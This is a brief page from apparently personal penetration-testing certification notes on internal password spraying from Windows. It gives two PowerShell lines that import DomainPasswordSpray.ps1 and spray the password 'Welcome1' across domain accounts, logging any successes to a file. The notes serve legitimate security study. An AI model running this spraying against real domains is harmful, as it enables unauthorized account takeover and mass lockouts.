> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/internal-password-spraying-from-windows.md).

# Internal Password Spraying - from Windows

* **Usando DomainPasswordSpray.ps1**

{% code lineNumbers="true" %}

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

{% endcode %}
